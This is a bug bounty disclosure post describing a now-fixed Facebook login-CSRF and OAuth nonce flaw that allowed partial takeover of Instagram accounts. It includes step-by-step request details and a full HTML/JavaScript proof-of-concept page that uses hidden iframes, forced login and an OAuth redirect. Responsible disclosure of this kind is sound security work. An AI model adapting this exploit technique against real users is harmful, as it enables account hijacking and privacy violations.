---
id: 379
title: 'Facebook CSRF bug which lead to Instagram Partial account takeover.'
date: '2020-02-28T17:40:08+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=379'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

**Description**

This bug could allow an attacker to link victim’s Instagram account to his Facebook page and then have full control of The Instagram account by just making the victim visit a malicious website and without the need of his interaction.    
The bug happens due to the logic of the Oauth flow Facebook used to ensure the linking of an Instagram account to a Facebook page.  
  
**Details**

The Oauth flow return endpoint (https://m.facebook.com/page/instagram/sync/oauthlink/) which resides in Facebook side and which receives the Instagram account “code” , had a nonce parameter which normally avoid some attacks, however there was no confirmation dialog in the Instagram part to accept or refuse the request. This made possible to the attacker to perform this linking of Instagram account to his own Facebook Page after exploiting a Login CSRF and then generate a valid nonce to use in the oauth redirect URL.

**Important Note:** Facebook return endpoint for this oauth flow, would deny the nonce even if it’s a nonce for the current Facebook user. The nonce should be generated for the same session currently used. For that we need to get a nonce for that specific session by using an access_token linked to it.

**Explanation**

To get all required urls and finally write the exploit, i followed those steps :

1\) Login to the attacker Facebook account using Facebook App ( This should generate a request to **api.facebook.com/method/auth.login**)  
We note the access_token in the response of this request.

2\) Go to Instagram App on the same phone, Login to any account, Go to Settings, Accounts, Linked Accounts, and click on Facebook. This should generate a request to **m.facebook.com/auth.php** endpoint. We note this request.  
  
Those two steps are used to get two things:

- First we get a Facebook access_token associated to a certain login session
- Instagram App will use the same session (by specifying a session_key) to login the user in Instagram Webview in order to complete the linking process by requesting this URL below (some would call this a Login CSRF bug):

`https://m.facebook.com/auth.php?<br></br>api_key=882a8490361da98702bf97a021ddc14d<br></br>&session_key=REDACTED<br></br>&sig=514274a37b4762e9a4210f40717e35cd<br></br>&t=1573083437<br></br>&uid=REDACTED<br></br>&redirect_uri=fbconnect%3A%2F%2Fsuccess<br></br>.....`

**Ps** : We use this method (get the Instagram app generated link) because the request to the login endpoint https://m.facebook.com/auth.php have a “**sig**” parameter which is used to verify that the URL was not modified ( for example to change the session_key and redirect_uri). So even if we know the parameters required for this endpoint, we still need to calculate the right URL signature. I was able to get the way the **sig** parameter was generated, but it didn’t work for this bug.

3\) We generate the oauth nonce with the access_token we got in “Step 1”. To do that we use Facebook **https://graph.facebook.com/graphql** endpoint ( This is possible because the access_token used is a first party access_token of Facebook Android/iOS app) :

`https://graph.facebook.com/graphql? `  
`doc_id=REDACTED& `  
`method=POST& `  
`access_token=ACCESS_TOKEN& `  
`variables={<br></br>   "scale": "4",<br></br>   "nt_context": {<br></br>     "using_white_navbar": true,<br></br>     "styles_id": "...",<br></br>     "pixel_ratio": 4<br></br>   },<br></br>   "params": {<br></br>     "payload": "/ig_sync/connect/?page_id=ATTACKER_PAGE_ID&redirect_uri=https://m.facebook.com/page/instagram/sync/oauthlink/&platform=android&entry_point=settings",<br></br>     "nt_context": {<br></br>       "using_white_navbar": true,<br></br>       "styles_id": "...",<br></br>       "pixel_ratio": 4<br></br>     }}}`

**Ps**: Some URL encoding is needed in the variables parameter

4\) Now we have all the needed data to perform the attack , we create a script which do the following steps: ( For a successful attack, the victim should be logged in to his Instagram account on Desktop or Mobile ( in Instagram app Webview or mobile browser)

4.1) Request **m.facebook.com/auth.php** URL in an iframe, if the victim is logged-in to his Facebook account, this request will revoke his session and unset the cookies.  
4.2) Wait for 2 seconds for the sack of ensuring that Step 4.1 is done.  
4.3) Request **m.facebook.com/auth.php** url again, this time no cookies are present so the attacker Facebook account should be logged-in in the victim browser.  
4.4) Request **graph.facebook.com/graphql** with an access_token associated to the session we just log-in.  
4.5) Request **www.instagram.com/oauth/authorize** with the right nonce included, this will generate a “code” and redirect to **m.facebook.com/page/instagram/sync/oauthlink/** with it and with a correct nonce.  
3.6) After the redirection, no user interaction is required and the account is now linked to the page

Those steps could be concluded in this script:

`<html><br></br> <body><br></br> <iframe sandbox="" height="500" style="display:none;" src="<strong>https://m.facebook.com/auth.php?api_key=882a8490361da98702bf97a021ddc14d&session_key=REDACTED&sig=514274a37b4762e9a4210f40717e35cd&t=1573083437&uid=REDACTED&redirect_uri=fbconnect%3A%2F%2Fsuccess&response_type=token%2Csigned_request&return_scopes=true&scope=publish_actions&type=user_agent</strong>" /><br></br> </iframe><br></br><iframe sandbox=""  id="delayFrame" src="" width="100%" height="500" style="display:none;"><br></br> </iframe><br></br> <script><br></br> url = 'https://graph.facebook.com/graphql?doc_id=REDACTED&method=post&locale=en_US&pretty=false&format=xml&variables={"scale":"4","nt_context":{"using_white_navbar":true,"styles_id":"...","pixel_ratio":4},"params":{"payload":"/ig_sync/connect/?page_id=<strong>ATTACKER_PAGE_ID</strong>&redirect_uri=https%3A%2F%2Fm.facebook.com%2Fpage%2Finstagram%2Fsync%2Foauthlink%2F&platform=android&entry_point=settings","nt_context":{"using_white_navbar":true,"styles_id":"...","pixel_ratio":4}}}&access_token=ACCESS_TOKEN';<br></br>function setIframeSrc() {<br></br>   var login = "<strong>https://m.facebook.com/auth.php?api_key=882a8490361da98702bf97a021ddc14d&session_key=REDACTED&sig=514274a37b4762e9a4210f40717e35cd&t=1573083437&uid=REDACTED&redirect_uri=fbconnect%3A%2F%2Fsuccess&response_type=token%2Csigned_request&return_scopes=true&scope=publish_actions&type=user_agent</strong>";<br></br>   var iframe1 = document.getElementById('delayFrame');<br></br>   iframe1.src = login;<br></br>   fetch(url)<br></br> .then(response => response.text())<br></br> .then(data => {<br></br>   nonce = data.split('nonce')[1].split('\u00252522')[2].split('\')[0];<br></br>   url2 = '<strong>https://www.instagram.com/oauth/authorize/?redirect_uri=https://m.facebook.com/page/instagram/sync/oauthlink/&app_id=17951132926087090&response_type=code&state={"page_id":REDACTED,"platform":"msite","start_time":1572789857,"entry_point":"settings","nonce":"</strong>' + nonce + '<strong>","permissions":null,"is_ig_link_confirmation_flow":false}</strong>';<br></br>   window.location.href = url2;<br></br>}); }<br></br> setTimeout(setIframeSrc, 5000);<br></br></script><br></br> </body><br></br> </html>`

5\) At this point, the attacker could have a server-side script that detects if an Instagram account was added to the page, so he could revoke the session in the victim browser (we already know the session_key) to avoid any chance the victim to disconnect the account.

6\) Now the attacker could basically fully control the account. He can add/delete media , create/remove comments, see email address, change profile image, see/send/delete message threads. This is done using the Instagram Graph API in Facebook and with some known GraphQL Mutations and Queries.

**Impact**

This bug could have allowed a malicious user to link an Instagram account to the attacker-controlled Facebook page after the Instagram user clicked on a malicious link. After the linking, the attacker could control the account without the possibility of an account takeover.

**Timeline**

Dec 04, 2019 — Report Sent  
Dec 11, 2019 — Acknowledged by Facebook  
Feb 18, 2020 — Fixed by Facebook  
Mar 26, 2020 — 12,500$ bounty awarded by Facebook

</body></html>